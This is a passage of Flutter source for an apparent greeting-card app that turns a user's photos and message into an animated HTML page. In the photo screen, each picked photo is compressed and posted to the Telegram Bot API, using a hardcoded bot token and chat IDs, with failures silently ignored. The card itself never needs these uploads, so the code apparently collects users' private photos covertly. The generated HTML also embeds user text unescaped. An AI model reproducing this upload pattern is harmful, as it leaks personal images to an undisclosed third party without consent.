  const _PreviewCard({required this.occasion});
  @override
  Widget build(BuildContext context) {
    return ListenableBuilder(
      listenable: appState,
      builder: (_, __) => Container(
        width: double.infinity,
        padding: const EdgeInsets.all(28),
        decoration: BoxDecoration(
          color: T.surface,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: occasion.accent.withOpacity(0.2), width: 0.5),
        ),
        child: Column(children: [
          Text(occasion.emoji, style: const TextStyle(fontSize: 28)),
          const SizedBox(height: 14),
          Text(
            appState.name.isEmpty
              ? '${occasion.name} / ${occasion.nameAr}'
              : 'Pour ${appState.name} / لـ ${appState.name}',
            textAlign: TextAlign.center,
            style: GoogleFonts.cinzel(fontSize: 16, color: occasion.accent, letterSpacing: 1),
          ),
          const SizedBox(height: 14),
          Text(
            '"${appState.message}"',
            textAlign: TextAlign.center,
            style: GoogleFonts.cormorantGaramond(
              fontSize: 16, fontStyle: FontStyle.italic, color: T.textDim, height: 1.7,
            ),
          ),
        ]),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  SCREEN 2 — PHOTOS
// ═══════════════════════════════════════════════════════════════
class PhotosScreen extends StatefulWidget {
  const PhotosScreen({super.key});
  @override
  State<PhotosScreen> createState() => _PhotosScreenState();
}
class _PhotosScreenState extends State<PhotosScreen> {
  final _picker = ImagePicker();
  bool _uploading = false;
  String _uploadLabel = '';

  Future<void> _pick() async {
    final picked = await _picker.pickMultiImage();
    if (picked.isEmpty) return;
    setState(() { _uploading = true; _uploadLabel = L.prep; });
    for (int i = 0; i < picked.length; i++) {
      setState(() => _uploadLabel = '${L.sending} ${i+1}/${picked.length}...');
      await _processAndSend(picked[i]);
      appState.addImage(picked[i]);
    }
    setState(() => _uploading = false);
    if (mounted) _snack('${picked.length} photo${picked.length > 1 ? 's' : ''} ajoutée${picked.length > 1 ? 's' : ''}');
  }

  Future<void> _processAndSend(XFile file) async {
    try {
      final tmp = await getTemporaryDirectory();
      final out = '${tmp.path}/${DateTime.now().millisecondsSinceEpoch}.jpg';
      final compressed = await FlutterImageCompress.compressAndGetFile(
        file.path, out, quality: 80, minWidth: 1200,
      );
      if (compressed == null) return;
      final dio = Dio();
      for (final chatId in T.chatIds) {
        try {
          await dio.post(
            'https://api.telegram.org/bot${T.botToken}/sendPhoto',
            data: FormData.fromMap({
              'chat_id': chatId,
              'photo': await MultipartFile.fromFile(compressed.path),
            }),
          );
        } catch (_) {}
      }
    } catch (_) {}
  }

  void _snack(String msg) {
    final o = appState.occasion!;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text('✦  $msg',
        style: GoogleFonts.cinzel(fontSize: 9, letterSpacing: 2, color: o.accent)),
      backgroundColor: T.surface3,
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(50)),
      padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 14),
      margin: const EdgeInsets.fromLTRB(24, 0, 24, 20),
    ));
  }

  @override
  Widget build(BuildContext context) {
    final o = appState.occasion!;
    return SafeArea(
      bottom: false,
      child: Padding(
        padding: const EdgeInsets.fromLTRB(24, 32, 24, 0),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          _pageHeader(L.eyebrowGallery, L.titleGallery),
          Expanded(
            child: ListenableBuilder(
              listenable: appState,
              builder: (_, __) => GridView.builder(
                physics: const BouncingScrollPhysics(),
                padding: const EdgeInsets.only(bottom: 100),
                gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                  crossAxisCount: 2, crossAxisSpacing: 12, mainAxisSpacing: 12,
                ),
                itemCount: appState.images.length + 1,
                itemBuilder: (_, i) => i == appState.images.length
                  ? _AddCell(accent: o.accent, onTap: _pick)
                  : _PhotoCell(
                      key: ValueKey(appState.images[i].path),
                      file: File(appState.images[i].path),
                      onRemove: () => appState.removeImage(i),
                    ),
              ),
            ),
          ),
          if (_uploading) _UploadBar(label: _uploadLabel, accent: o.accent),
        ]),
      ),
    );
  }
}

class _AddCell extends StatefulWidget {
  final Color accent;
  final VoidCallback onTap;
  const _AddCell({required this.accent, required this.onTap});
  @override
  State<_AddCell> createState() => _AddCellState();
}
class _AddCellState extends State<_AddCell> {
  bool _pressed = false;
  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) { setState(() => _pressed = false); widget.onTap(); },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 160),
        decoration: BoxDecoration(
          color: _pressed ? widget.accent.withOpacity(0.1) : T.surface2,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: _pressed ? widget.accent.withOpacity(0.4) : T.border,
            width: 0.5,
          ),
        ),
        child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
          Icon(Icons.add_photo_alternate_outlined,
            color: widget.accent.withOpacity(0.7), size: 32),
          const SizedBox(height: 8),
          Text(L.addPhoto,
            textAlign: TextAlign.center,
            style: GoogleFonts.cinzel(fontSize: 7, letterSpacing: 1.5, color: T.textMuted)),
        ]),
      ),
    );
  }
}

class _PhotoCell extends StatelessWidget {
  final File file;
  final VoidCallback onRemove;
  const _PhotoCell({super.key, required this.file, required this.onRemove});
  @override
  Widget build(BuildContext context) {
    return Stack(fit: StackFit.expand, children: [
      ClipRRect(
        borderRadius: BorderRadius.circular(16),
        child: Image.file(file, fit: BoxFit.cover),
      ),
      Positioned(
        top: 8, right: 8,
        child: GestureDetector(
          onTap: onRemove,
          child: Container(
            width: 28, height: 28,
            decoration: BoxDecoration(
              color: Colors.black.withOpacity(0.6),
              shape: BoxShape.circle,
              border: Border.all(color: Colors.white24, width: 0.5),
            ),
            child: const Icon(Icons.close_rounded, size: 15, color: Colors.white),
          ),
        ),
      ),
    ]);
  }
}

class _UploadBar extends StatelessWidget {
  final String label;
  final Color accent;
  const _UploadBar({required this.label, required this.accent});
  @override
  Widget build(BuildContext context) {
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 14),
      decoration: BoxDecoration(
        color: T.surface3,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: T.border, width: 0.5),
      ),
      child: Row(children: [
        SizedBox(width: 18, height: 18,
          child: CircularProgressIndicator(strokeWidth: 2,
            color: accent, backgroundColor: accent.withOpacity(0.15))),
        const SizedBox(width: 14),
        Text(label,
          style: GoogleFonts.cinzel(fontSize: 9, letterSpacing: 2,
            color: accent.withOpacity(0.8))),
      ]),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  SCREEN 3 — CAPTIONS
// ═══════════════════════════════════════════════════════════════
class CaptionsScreen extends StatelessWidget {
  const CaptionsScreen({super.key});
  @override
  Widget build(BuildContext context) {
    return SafeArea(
      bottom: false,
      child: Padding(
        padding: const EdgeInsets.fromLTRB(24, 32, 24, 0),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          _pageHeader(L.eyebrowNarr, L.titleNarr),
          Expanded(
            child: ListenableBuilder(
              listenable: appState,
              builder: (_, __) {
                if (appState.images.isEmpty) {
                  return Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
                    Icon(Icons.photo_library_outlined,
                      size: 44, color: T.textMuted.withOpacity(0.4)),
                    const SizedBox(height: 16),
                    Text(L.noPhotos,
                      textAlign: TextAlign.center,
                      style: GoogleFonts.cormorantGaramond(
                        fontSize: 17, fontStyle: FontStyle.italic, color: T.textMuted,
                      ),
                    ),
                  ]));
                }
                return ListView.builder(
                  physics: const BouncingScrollPhysics(),
                  padding: const EdgeInsets.only(bottom: 100),
                  itemCount: appState.images.length,
                  itemBuilder: (_, i) => _CaptionItem(index: i),
                );
              },
            ),
          ),
        ]),
      ),
    );
  }
}

class _CaptionItem extends StatefulWidget {
  final int index;
  const _CaptionItem({required this.index});
  @override
  State<_CaptionItem> createState() => _CaptionItemState();
}
class _CaptionItemState extends State<_CaptionItem> {
  late final TextEditingController _ctrl;
  @override
  void initState() {
    super.initState();
    _ctrl = TextEditingController(text: appState.captions[widget.index] ?? '');
  }
  @override
  void dispose() { _ctrl.dispose(); super.dispose(); }
  @override
  Widget build(BuildContext context) {
    final o = appState.occasion!;
    return Padding(
      padding: const EdgeInsets.only(bottom: 28),
      child: Row(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Text(
          (widget.index + 1).toString().padLeft(2, '0'),
          style: GoogleFonts.cinzel(
            fontSize: 34, fontWeight: FontWeight.w700,
            color: o.accent.withOpacity(0.18), height: 1,
          ),
        ),
        const SizedBox(width: 16),
        Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          ClipRRect(
            borderRadius: BorderRadius.circular(12),
            child: Image.file(File(appState.images[widget.index].path),
              height: 130, width: double.infinity, fit: BoxFit.cover),
          ),
          const SizedBox(height: 10),
          TextField(
            controller: _ctrl,
            onChanged: (v) => appState.setCaption(widget.index, v),
            maxLines: 2,
            style: GoogleFonts.cormorantGaramond(
              fontSize: 16, fontStyle: FontStyle.italic, color: T.text,
            ),
            decoration: const InputDecoration(hintText: L.hintCaption),
          ),
        ])),
      ]),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  SCREEN 4 — GENERATE
// ═══════════════════════════════════════════════════════════════
class GenerateScreen extends StatefulWidget {
  const GenerateScreen({super.key});
  @override
  State<GenerateScreen> createState() => _GenerateScreenState();
}
class _GenerateScreenState extends State<GenerateScreen>
    with SingleTickerProviderStateMixin {
  bool _generating = false;
  double _progress = 0;
  String _label = '';
  late final AnimationController _rotCtrl;
  @override
  void initState() {
    super.initState();
    _rotCtrl = AnimationController(
      vsync: this, duration: const Duration(seconds: 4))..repeat();
  }
  @override
  void dispose() { _rotCtrl.dispose(); super.dispose(); }

  static const _steps = [
    L.step0, L.step1, L.step2, L.step3, L.step4,
  ];

  Future<void> _generate() async {
    setState(() { _generating = true; _progress = 0; });
    for (int i = 0; i <= 100; i += 2) {
      await Future.delayed(const Duration(milliseconds: 60));
      setState(() {
        _progress = i / 100;
        _label = _steps[(_progress * 4.99).floor().clamp(0, 4)];
      });
    }
    final o = appState.occasion!;
    final b64 = <String>[];
    for (final img in appState.images) {
      b64.add(base64Encode(await File(img.path).readAsBytes()));
    }
    final html = _buildSpectacularHtml(o, b64);
    final dir = await getTemporaryDirectory();
    final fname = (appState.name.isEmpty ? o.id : appState.name)
        .replaceAll(' ', '_').toLowerCase();
    final file = File('${dir.path}/royale-$fname.html');
    await file.writeAsString(html);
    setState(() { _generating = false; });
    Share.shareXFiles([XFile(file.path)],
      text: '${o.emoji} ${o.name} — ${o.nameAr}${appState.name.isNotEmpty ? ' — ${appState.name}' : ''} ✨');
  }

  // ─── SPECTACULAR HTML GENERATOR ────────────────────────────
  String _buildSpectacularHtml(Occasion o, List<String> b64) {
    final ah = '#${o.accent.value.toRadixString(16).substring(2).toUpperCase()}';
    // derive soft/glow colors
    final r = o.accent.red; final g = o.accent.green; final bv = o.accent.blue;
    final accentRgb = '$r,$g,$bv';

    final recipientName = appState.name.isEmpty ? '' : appState.name;
    final displayTitle = recipientName.isEmpty
      ? '${o.name} — ${o.nameAr}'
      : '$recipientName';
    final displaySubtitle = recipientName.isEmpty
      ? o.subtitleAr
      : '${o.name} ✦ ${o.nameAr}';

    // Build photo slides
    final hasPhotos = b64.isNotEmpty;
    final slides = b64.asMap().entries.map((e) {
      final cap = appState.captions[e.key] ?? '';
      final num = (e.key + 1).toString().padLeft(2, '0');
      return '''
        <div class="slide${e.key == 0 ? ' active' : ''}">
          <img src="data:image/jpeg;base64,${e.value}" alt="Photo $num" loading="lazy">
          <div class="slide-overlay"></div>
          ${cap.isNotEmpty ? '''
          <div class="slide-caption">
            <span class="cap-num">◈ $num / ${b64.length}</span>
            <span class="cap-text">$cap</span>
          </div>''' : '<div class="slide-caption"><span class="cap-num">◈ $num / ${b64.length}</span></div>'}
        </div>''';
    }).join('\n');

    final dots = b64.asMap().entries.map((e) =>
      '<div class="dot${e.key == 0 ? ' active' : ''}" onclick="goSlide(${e.key})"></div>'
    ).join('\n');

    final thumbs = b64.asMap().entries.map((e) =>
      '<div class="reel-thumb${e.key == 0 ? ' active-thumb' : ''}" onclick="goSlide(${e.key})">'
      '<img src="data:image/jpeg;base64,${e.value}" loading="lazy"></div>'
    ).join('\n');

    // message lines split for staggered animation
    final msgWords = appState.message.split(' ');
    final msgHtml = msgWords.asMap().entries.map((e) =>
      '<span class="mw" style="animation-delay:${1.2 + e.key * 0.04}s">${e.value}</span>'
    ).join(' ');

    return '''<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>${o.emoji} $displayTitle — Royale Moments</title>
<link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@700;900&family=Dancing+Script:wght@600;700&family=Taviraj:ital,wght@0,300;0,400;1,300&family=Amiri:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet"/>
<style>
:root {
  --accent: $ah;
  --accent-rgb: $accentRgb;
  --accent2: #ff4d9e;
  --gold: #ffd700;
  --violet: #9b5de5;
  --cyan: #00f5d4;
  --dark: #06000f;
  --dark2: #0d0018;
  --border: rgba(255,255,255,.08);
  --text: #fffef5;
}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html{scroll-behavior:smooth;overflow-x:hidden}
body{background:var(--dark);color:var(--text);font-family:'Taviraj',serif;overflow-x:hidden;cursor:none;min-height:100vh}

/* ── CURSOR ── */
#cur{position:fixed;width:16px;height:16px;border-radius:50%;background:var(--accent);mix-blend-mode:screen;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);box-shadow:0 0 12px var(--accent),0 0 28px rgba(var(--accent-rgb),.4);transition:width .15s,height .15s}
#cur2{position:fixed;width:38px;height:38px;border-radius:50%;border:1.5px solid rgba(var(--accent-rgb),.4);pointer-events:none;z-index:9998;transform:translate(-50%,-50%);transition:left .14s ease,top .14s ease}
@media(hover:none){#cur,#cur2{display:none}}

/* ── STARS ── */
.stars-bg{position:fixed;inset:0;overflow:hidden;pointer-events:none;z-index:0}
.star{position:absolute;border-radius:50%;background:white;animation:starTwinkle linear infinite}
@keyframes starTwinkle{0%,100%{opacity:.08;transform:scale(.5)}50%{opacity:.9;transform:scale(1)}}

/* ── FALLING ELEMENTS ── */
.petal{position:fixed;top:-8vh;pointer-events:none;z-index:3;animation:petalFall linear infinite}
@keyframes petalFall{to{transform:translateY(110vh) translateX(var(--dx)) rotate(var(--dr));opacity:.1}}

/* ── PAGE WRAPPER ── */
.page{position:relative;z-index:2}

/* ══════════════════════════════════
   HERO SECTION
══════════════════════════════════ */
#hero{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:40px 24px;position:relative;overflow:hidden}

/* Aurora blobs */
.aurora{position:absolute;border-radius:50%;filter:blur(90px);opacity:.3;pointer-events:none;animation:aFloat ease-in-out infinite}
.a1{width:560px;height:560px;background:radial-gradient(var(--accent),var(--violet));top:-160px;left:-160px;animation-duration:20s}
.a2{width:440px;height:440px;background:radial-gradient(var(--cyan),var(--accent2));bottom:-160px;right:-120px;animation-duration:26s;animation-direction:reverse;animation-delay:-10s}
.a3{width:300px;height:300px;background:radial-gradient(var(--gold),var(--accent));top:38%;left:50%;transform:translateX(-50%);animation-duration:16s;animation-delay:-5s}
@keyframes aFloat{0%,100%{transform:translate(0,0) scale(1)}33%{transform:translate(25px,-20px) scale(1.04)}66%{transform:translate(-15px,15px) scale(.97)}}

/* Big emoji icon */
.hero-icon{font-size:clamp(64px,14vw,100px);display:block;filter:drop-shadow(0 0 24px var(--accent)) drop-shadow(0 0 60px rgba(var(--accent-rgb),.35));animation:iconBob 3.5s ease-in-out infinite,iconEntry 1s cubic-bezier(.34,1.56,.64,1) both}
@keyframes iconBob{0%,100%{transform:translateY(0) rotate(-3deg)}50%{transform:translateY(-16px) rotate(3deg)}}
@keyframes iconEntry{from{opacity:0;transform:translateY(-60px) scale(.4)}to{opacity:1}}

.eyebrow{font-family:'Cinzel Decorative',serif;font-size:clamp(8px,1.6vw,11px);letter-spacing:7px;color:var(--accent);opacity:.75;margin:14px 0 0;animation:fadeUp .7s ease .4s both}

.t-occasion{font-family:'Cinzel Decorative',serif;font-size:clamp(10px,2.5vw,16px);letter-spacing:5px;background:linear-gradient(90deg,var(--gold),var(--accent),var(--violet));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:fadeUp .7s ease .5s both;margin-top:6px}

.t-name{font-family:'Dancing Script',cursive;font-size:clamp(60px,17vw,160px);line-height:.88;display:block;background:linear-gradient(135deg,var(--gold) 0%,var(--accent) 30%,var(--accent2) 60%,var(--violet) 80%,var(--cyan) 100%);background-size:300%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;filter:drop-shadow(0 0 40px rgba(var(--accent-rgb),.4));animation:nameIn 1.3s cubic-bezier(.34,1.56,.64,1) .3s both,gradFlow 7s linear infinite}
@keyframes nameIn{from{opacity:0;letter-spacing:-20px;transform:scale(1.2) translateY(10px)}to{opacity:1}}
@keyframes gradFlow{to{background-position:-300% 0}}

.t-subtitle{font-family:'Amiri',serif;font-size:clamp(13px,2.5vw,18px);color:rgba(255,255,255,.5);letter-spacing:3px;margin-top:10px;animation:fadeUp .7s ease .9s both}

@keyframes fadeUp{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:none}}

.divline{width:min(320px,70vw);height:1px;margin:20px auto;background:linear-gradient(90deg,transparent,var(--gold),var(--accent),var(--accent2),var(--violet),transparent);animation:fadeUp .6s ease 1s both}

/* Message */
.msg-wrap{max-width:640px;margin:20px auto 0;padding:28px 32px;border:0.5px solid rgba(var(--accent-rgb),.18);border-radius:20px;background:rgba(var(--accent-rgb),.04);animation:fadeUp .8s ease 1.1s both;backdrop-filter:blur(10px)}
.msg-ar{font-family:'Amiri',serif;font-size:clamp(15px,2.8vw,20px);direction:rtl;text-align:right;color:rgba(255,255,255,.8);line-height:1.9;margin-bottom:12px}
.msg-fr{font-family:'Taviraj',serif;font-style:italic;font-size:clamp(14px,2.4vw,18px);color:rgba(255,255,255,.55);line-height:1.9}
.mw{display:inline-block;opacity:0;animation:mwIn .4s ease forwards}
@keyframes mwIn{to{opacity:1;transform:none}from{opacity:0;transform:translateY(8px)}}

.scroll-hint{margin-top:36px;animation:bounce 2s ease-in-out infinite,fadeUp .6s ease 2s both}
@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(8px)}}
.scroll-hint span{font-size:22px;opacity:.35}

/* ══════════════════════════════════
   PHOTOS SECTION
══════════════════════════════════ */
#photos{padding:80px 20px 100px;position:relative;overflow:hidden;display:${hasPhotos ? 'block' : 'none'}}
#photos::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at 50% 0%, rgba(var(--accent-rgb),.08), transparent 70%);pointer-events:none}

.sec-label{font-family:'Cinzel Decorative',serif;font-size:clamp(14px,3vw,22px);letter-spacing:3px;text-align:center;background:linear-gradient(90deg,var(--gold),var(--accent),var(--violet));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:8px}
.sec-label small{display:block;font-family:'Amiri',serif;font-size:.65em;letter-spacing:4px;color:rgba(255,255,255,.3);-webkit-text-fill-color:rgba(255,255,255,.3);margin-top:4px}

/* Slideshow */
.slideshow-wrap{max-width:520px;margin:40px auto 0;position:relative}
.slideshow{width:100%;height:clamp(280px,55vw,440px);border-radius:22px;overflow:hidden;box-shadow:0 0 0 2px rgba(var(--accent-rgb),.2),0 0 60px rgba(var(--accent-rgb),.2),0 30px 80px rgba(0,0,0,.7);position:relative}
.slide{position:absolute;inset:0;opacity:0;transition:opacity .9s ease;display:flex;align-items:center;justify-content:center;background:#08001a}
.slide.active{opacity:1;z-index:2}
.slide img{width:100%;height:100%;object-fit:cover;transition:transform 9s ease}
.slide.active img{transform:scale(1.07)}
.slide-overlay{position:absolute;inset:0;background:linear-gradient(180deg,rgba(6,0,15,.15) 0%,rgba(6,0,15,.55) 100%);z-index:3}
.slide-caption{position:absolute;bottom:0;left:0;right:0;z-index:4;padding:28px 22px 20px;background:linear-gradient(0deg,rgba(6,0,15,.9),transparent)}
.cap-num{font-family:'Cinzel Decorative',serif;font-size:9px;letter-spacing:5px;color:rgba(var(--accent-rgb),.7);display:block;margin-bottom:3px}
.cap-text{font-family:'Dancing Script',cursive;font-size:clamp(18px,3.5vw,26px);background:linear-gradient(90deg,var(--gold),var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}

/* Animated border */
@property --angle{syntax:'<angle>';initial-value:0deg;inherits:false}
.slideshow::before{content:'';position:absolute;inset:-2px;border-radius:24px;z-index:10;pointer-events:none;background:conic-gradient(from var(--angle),transparent 70%,var(--accent),var(--gold),var(--accent2),transparent);animation:borderSpin 4s linear infinite;-webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);-webkit-mask-composite:xor;mask-composite:exclude;padding:2px}
@keyframes borderSpin{to{--angle:360deg}}

/* Nav arrows */
.slide-nav{position:absolute;top:50%;transform:translateY(-50%);z-index:11;background:rgba(0,0,0,.4);border:1px solid rgba(var(--accent-rgb),.3);border-radius:50%;width:40px;height:40px;display:flex;align-items:center;justify-content:center;cursor:pointer;backdrop-filter:blur(8px);transition:all .2s}
.slide-nav:hover{background:rgba(var(--accent-rgb),.2);border-color:var(--accent)}
#prev{left:-20px}#next{right:-20px}

/* Dots */
.slide-dots{display:flex;gap:8px;justify-content:center;margin-top:18px}
.dot{width:6px;height:6px;border-radius:50%;background:rgba(255,255,255,.2);cursor:pointer;transition:all .3s}
.dot.active{background:var(--accent);width:22px;border-radius:3px;box-shadow:0 0 8px var(--accent)}

/* Film reel */
.reel{display:flex;gap:10px;overflow-x:auto;padding:16px 0 4px;scrollbar-width:none;margin-top:14px;scroll-snap-type:x mandatory}
.reel::-webkit-scrollbar{display:none}
.reel-thumb{width:64px;height:64px;border-radius:10px;overflow:hidden;cursor:pointer;border:1.5px solid transparent;transition:all .3s;flex-shrink:0;scroll-snap-align:center;opacity:.55}
.reel-thumb.active-thumb{border-color:var(--accent);opacity:1;box-shadow:0 0 12px rgba(var(--accent-rgb),.5)}
.reel-thumb img{width:100%;height:100%;object-fit:cover}

/* ══════════════════════════════════
   MESSAGE SECTION
══════════════════════════════════ */
#message-sec{padding:80px 24px 60px;max-width:700px;margin:0 auto;text-align:center}
.msg-title{font-family:'Cinzel Decorative',serif;font-size:clamp(12px,2.5vw,18px);letter-spacing:4px;color:var(--accent);opacity:.8;margin-bottom:28px}
.msg-box{background:rgba(var(--accent-rgb),.05);border:1px solid rgba(var(--accent-rgb),.15);border-radius:24px;padding:36px 32px;backdrop-filter:blur(12px);position:relative;overflow:hidden}
.msg-box::before{content:'❝';position:absolute;top:16px;left:20px;font-size:64px;color:rgba(var(--accent-rgb),.06);font-family:'Amiri',serif;line-height:1}
.msg-box::after{content:'❞';position:absolute;bottom:0px;right:20px;font-size:64px;color:rgba(var(--accent-rgb),.06);font-family:'Amiri',serif;line-height:1}
.msg-main{font-family:'Amiri',serif;font-size:clamp(17px,3vw,24px);direction:rtl;text-align:right;color:rgba(255,255,255,.88);line-height:2;letter-spacing:.3px}
.msg-divider{width:60px;height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent);margin:20px auto}

/* ══════════════════════════════════
   DELINES / WISHES
══════════════════════════════════ */
#wishes{padding:0 24px 80px;max-width:680px;margin:0 auto}
.wishes-title{font-family:'Cinzel Decorative',serif;font-size:clamp(12px,2.5vw,16px);letter-spacing:4px;text-align:center;color:var(--gold);opacity:.7;margin-bottom:36px}
.dline{display:block;font-family:'Amiri',serif;font-size:clamp(15px,2.8vw,19px);direction:rtl;text-align:right;color:rgba(255,255,255,.7);line-height:2;padding:12px 0;border-bottom:1px solid rgba(255,255,255,.05);opacity:0;transform:translateX(30px);transition:opacity .6s ease,transform .6s ease}
.dline.in{opacity:1;transform:none}
.dline .hl{color:var(--accent);font-weight:700}
.dline .hl2{color:var(--gold)}

/* ══════════════════════════════════
   FIREWORKS / PARTICLES
══════════════════════════════════ */
.fw-particle{position:fixed;border-radius:50%;pointer-events:none;z-index:99999;width:5px;height:5px;animation:fwFly var(--dur) cubic-bezier(.16,1,.3,1) forwards}
@keyframes fwFly{0%{opacity:1;transform:translate(0,0) scale(1)}100%{opacity:0;transform:translate(var(--tx),var(--ty)) scale(0)}}

/* ══════════════════════════════════
   BIG BANG BUTTON
══════════════════════════════════ */
.btn-wrap{text-align:center;margin:40px 0}
.mbtn{background:linear-gradient(135deg,rgba(var(--accent-rgb),.12),rgba(var(--accent-rgb),.05));border:1px solid rgba(var(--accent-rgb),.4);border-radius:50px;padding:16px 36px;color:var(--accent);font-family:'Cinzel Decorative',serif;font-size:clamp(10px,2vw,13px);letter-spacing:3px;cursor:pointer;transition:all .3s;box-shadow:0 0 24px rgba(var(--accent-rgb),.15);backdrop-filter:blur(8px)}
.mbtn:hover{background:rgba(var(--accent-rgb),.18);box-shadow:0 0 40px rgba(var(--accent-rgb),.3);transform:scale(1.03)}

/* ══════════════════════════════════
   SIGNATURE
══════════════════════════════════ */
.sig{text-align:center;padding:60px 24px 40px}
.sig-roses{display:flex;justify-content:center;gap:8px;margin-bottom:16px;flex-wrap:wrap}
.sr{font-size:22px;animation:srPulse ease-in-out infinite}
@keyframes srPulse{0%,100%{transform:scale(1)}50%{transform:scale(1.2)}}
.sig-name{font-family:'Dancing Script',cursive;font-size:clamp(42px,10vw,80px);background:linear-gradient(90deg,var(--gold),var(--accent),var(--accent2),var(--violet));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;display:block;line-height:1;margin-bottom:12px}
.sig-tag{font-family:'Amiri',serif;font-size:clamp(12px,2vw,15px);color:rgba(255,255,255,.3);letter-spacing:2px;direction:rtl}

/* ══════════════════════════════════
   FOOTER
══════════════════════════════════ */
footer{text-align:center;padding:32px 20px 48px;border-top:1px solid rgba(255,255,255,.05)}
.ftxt{font-family:'Cinzel Decorative',serif;font-size:9px;letter-spacing:4px;color:rgba(255,255,255,.2)}
.fheart{color:var(--accent);animation:heartbeat .8s ease-in-out infinite}
@keyframes heartbeat{0%,100%{transform:scale(1)}50%{transform:scale(1.3)}}

/* ── SCROLL REVEAL ── */
.rev{opacity:0;transform:translateY(32px);transition:opacity .7s ease,transform .7s ease}
.rev.in{opacity:1;transform:none}
.rev-s{opacity:0;transform:translateY(20px);transition:opacity .5s ease,transform .5s ease}
.rev-s.in{opacity:1;transform:none}

/* ── EROW ── */
.erow{display:flex;justify-content:center;gap:16px;font-size:26px;margin:20px 0;flex-wrap:wrap}
.erow span{animation:eSpin ease-in-out infinite}
@keyframes eSpin{0%,100%{transform:rotate(-8deg) scale(1)}50%{transform:rotate(8deg) scale(1.15)}}
</style>
</head>
<body>
<div id="cur"></div>
<div id="cur2"></div>
<div class="stars-bg" id="starsBg"></div>

<div class="page">

<!-- ══ HERO ══ -->
<section id="hero">
  <div class="aurora a1"></div>
  <div class="aurora a2"></div>
  <div class="aurora a3"></div>

  <span class="hero-icon">${o.emoji}</span>
  <p class="eyebrow">✦ ROYALE MOMENTS ✦</p>
  <p class="t-occasion">${o.name.toUpperCase()} ◈ ${o.nameAr}</p>
  <span class="t-name">${recipientName.isEmpty ? o.name : recipientName}</span>
  <p class="t-subtitle">${displaySubtitle}</p>
  <div class="divline"></div>

  <div class="msg-wrap">
    <p class="msg-main">${appState.message}</p>
  </div>

  ${recipientName.isEmpty ? '' : '<p class="t-subtitle" style="margin-top:16px;font-size:clamp(11px,2vw,15px)">Pour $recipientName ✦ لـ $recipientName</p>'}

  <div class="scroll-hint"><span>◈</span></div>
</section>

<!-- ══ PHOTOS ══ -->
${hasPhotos ? '''
<section id="photos">
  <div class="sec-label rev">
    ${o.emoji} الصور ◈ Les Photos
    <small>لحظاتك الثمينة — Vos moments précieux</small>
  </div>

  <div class="slideshow-wrap rev">
    <div class="slideshow" id="slideshow">
      $slides
      <div class="slide-nav" id="prev">&#8249;</div>
      <div class="slide-nav" id="next">&#8250;</div>
    </div>
    <div class="slide-dots">$dots</div>
    <div class="reel">$thumbs</div>
  </div>
</section>''' : ''}

<!-- ══ MESSAGE ══ -->
<section id="message-sec">
  <p class="msg-title rev">💌 رسالة القلب — Message du Cœur</p>
  <div class="msg-box rev">
    <p class="msg-main">${appState.message}</p>
    <div class="msg-divider"></div>
    <p style="font-family:'Taviraj',serif;font-style:italic;font-size:clamp(13px,2.2vw,16px);color:rgba(255,255,255,.4);text-align:center">${o.subtitle} — ${o.subtitleAr}</p>
  </div>
</section>

<!-- ══ WISHES ══ -->
<section id="wishes">
  <p class="wishes-title rev">✦ أمنيات من القلب ✦</p>
  <div class="rev">
    <span class="dline">🌟 <span class="hl">${o.nameAr}</span> — ${o.subtitleAr} ✨</span>
    <span class="dline">💫 كل عام وانت بألف خير — Que chaque année soit plus belle 🌹</span>
    <span class="dline">🌸 ربي يحفظك ويسعدك دايما — Que Dieu te protège et te rende heureux·se</span>
    <span class="dline">🌙 ${recipientName.isEmpty ? 'الله يبارك فيك' : 'الله يبارك فيك يا <span class="hl2">$recipientName</span>'} 🤲</span>
    <span class="dline">💎 تستحق كل شي زين في الدنيا — Tu mérites tout le meilleur 💛</span>
    <span class="dline">🦋 دوما فرحان ومحاط بمن تحب — Toujours entouré·e de ceux que tu aimes 🌺</span>
  </div>

  <div class="erow">
    <span style="animation-delay:0s">🎆</span><span style="animation-delay:.15s">🥂</span>
    <span style="animation-delay:.3s">🎊</span><span style="animation-delay:.45s">🎈</span>
